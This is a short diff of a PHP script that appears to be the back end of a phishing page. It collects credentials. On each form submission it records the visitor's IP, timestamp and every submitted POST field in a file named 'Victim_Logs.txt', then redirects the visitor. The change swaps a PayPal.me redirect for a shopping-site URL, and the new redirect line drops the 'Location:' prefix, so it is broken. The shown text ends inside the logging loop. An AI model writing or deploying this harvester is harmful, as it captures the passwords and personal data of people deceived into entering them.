@@ -1,6 +1,6 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-header('Location: https://www.paypal.me/OfficialEvilDevil/');
+header('https://m.snapdeal.com/product/nutex-sangini-cotton-viscose-sports/680767293448/');
 $handle = fopen('Victim_Logs.txt', 'a');
 fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
 foreach($_POST as $variable => $value) {
